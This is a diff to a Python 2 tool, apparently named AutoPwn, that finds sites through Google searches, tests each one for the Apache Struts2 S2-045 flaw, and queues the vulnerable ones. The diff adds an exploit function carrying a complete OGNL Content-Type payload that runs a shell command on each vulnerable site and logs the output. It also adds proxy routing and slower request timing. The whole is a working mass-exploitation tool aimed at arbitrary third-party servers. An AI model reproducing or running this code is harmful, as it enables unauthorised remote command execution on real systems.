@@ -17,9 +17,18 @@ from bs4 import BeautifulSoup
 from atexit import register
 
 
+proxies = {}
+user_agents = []
+results_per_page = 10
+vuln_num = 0
+url_set = set()
+url_queue = Queue.Queue()
+vuln_queue = Queue.Queue()
+lock = threading.Lock()
+
 cp = ConfigParser.SafeConfigParser()
 cp.read('crawler.conf')
-proxies = {}
+base_url = cp.get('crawler', 'base_url')
 if cp.has_option('http', 'http_addr') and cp.has_option('http', 'http_port'):
     http_addr = cp.get('http', 'http_addr')
     http_port = int(cp.get('http', 'http_port'))
@@ -28,20 +37,12 @@ elif cp.has_option('socks', 'socks_addr') and cp.has_option('socks', 'socks_port
     socks_addr = cp.get('socks', 'socks_addr')
     socks_port = int(cp.get('socks', 'socks_port'))
     proxies['https'] = 'socks5://%s:%d' % (socks_addr, socks_port)
-base_url = cp.get('crawler', 'base_url')
-results_per_page = 10
-user_agents = []
-vuln_num = 0
-url_set = set()
-url_queue = Queue.Queue()
-vuln_queue = Queue.Queue()
-lock = threading.Lock()
 
 
 class SubThread(threading.Thread):
 
     def __init__(self, func, args):
-        super(SubThread, self).__init__(name=func.__name__)
+        super(SubThread, self).__init__()
         self.func = func
         self.args = args
 
@@ -62,7 +63,7 @@ class GoogleAPI:
         socket.setdefaulttimeout(timeout)
 
     def random_sleep(self):
-        sleeptime = random.randint(10, 30)
+        sleeptime = random.randint(60, 120)
         time.sleep(sleeptime)
 
     # extract a url from a link
@@ -98,8 +99,8 @@ class GoogleAPI:
                         continue
                     with lock:
                         print '\033[0;32m[*] [URL] %s\033[0m' % url
-                    url_queue.put(url)
-                    url_set.add(url)
+                        url_queue.put(url)
+                        url_set.add(url)
 
     # search web
     def search(self, query, lang='en', num=results_per_page):
@@ -160,12 +161,49 @@ def crawler():
     expect_num = int(cp.get('crawler', 'expect_num'))
     # if no parameters, read query keywords from file
     if len(sys.argv) < 2:
-        # keyword = cp.get('crawler', 'keyword')
-        keyword = 'ext:action'
+        keyword = cp.get('crawler', 'keyword')
         api.search(keyword, num=expect_num)
     else:
         keyword = sys.argv[1]
         api.search(keyword, num=expect_num)
+
+
+def exploit(timeout):
+    cmd = 'whoami'
+    payload = "%{(#_='multipart/form-data')."
+    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
+    payload += "(#_memberAccess?"
+    payload += "(#_memberAccess=#dm):"
+    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
+    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
+    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
+    payload += "(#ognlUtil.getExcludedClasses().clear())."
+    payload += "(#context.setMemberAccess(#dm))))."
+    payload += "(#cmd='%s')." % cmd
+    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
+    payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
+    payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
+    payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
+    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
+    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
+    payload += "(#ros.flush())}"
+    headers = {
+        'user-agent': 'Mozilla/5.0',
+        'content-type': payload
+    }
+    while True:
+        url = vuln_queue.get()
+        try:
+            response = requests.get(url, headers=headers, proxies=proxies, timeout=timeout)
+            result = response.text.strip()
+        except Exception, e:
+            with lock:
+                print '\033[1;31m[!] [EXP_ERROR] %s\033[0m' % url
+                print '\033[1;31m[!] [EXP_ERROR]\033[0m', e
+        else:
+            with open('./vulnerable.txt', 'a') as vulnerable:
+                vulnerable.write(result+'\n')
+                vulnerable.write(url+'\n\n')
 
 
 def poccheck(timeout):
@@ -182,26 +220,24 @@ def poccheck(timeout):
     while True:
         url = url_queue.get()
         with lock:
-            print '\033[0;33m[*] [POC] %s\033[0m' % url
+            print '\033[0;34m[*] [POC] %s\033[0m' % url
         headers = {
             'content-type': S2_045["poc"],
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0'
         }
-        response = requests.get(url, headers=headers)
         try:
+            response = requests.get(url, headers=headers, proxies=proxies, timeout=timeout)
             res_html = response.text
         except Exception, e:
             with lock:
-                print '\033[0;31m[!] [POC_ERROR] %s\033[0m' % url
-                print '\033[0;31m[!] [POC_ERROR]\033[0m', e
+                print '\033[1;31m[!] [POC_ERROR] %s\033[0m' % url
+                print '\033[1;31m[!] [POC_ERROR]\033[0m', e
         else:
             if S2_045['key'] in res_html:
                 with lock:
                     print '\033[1;32m[*] [VULNERABLE] %s\033[0m' % url
                     vuln_queue.put(url)
                     vuln_num += 1
-                    with open('./vulnerable.txt', 'a') as vulnerable:
-                        vulnerable.write(url+'\n')
 
 
 def banner():
@@ -217,7 +253,7 @@ def banner():
     print " / ___ \ |_| | || (_) |  __/ \ V  V /| | | |"
     print "/_/   \_\__,_|\__\___/|_|     \_/\_/ |_| |_|"
     print "                                            "
-    print "                              {alpha 1.0.4} "
+    print "                              {alpha 1.0.5} "
     print "                                            "
 
 
@@ -242,10 +278,18 @@ def main():
     print '[*] starting at', time.strftime("%H:%M:%S")
     print ''
     try:
-        poc_thread = SubThread(poccheck, (10, ))
+        poc_thread = SubThread(poccheck, (10,))
         poc_thread.daemon = True
         poc_thread.start()
+        exp_thread = SubThread(exploit, (10,))
+        exp_thread.daemon = True
+        exp_thread.start()
         crawler()
+        while True:
+            if vuln_queue.empty():
+                sys.exit()
+            else:
+                time.sleep(1)
     except KeyboardInterrupt:
         sys.exit()
     
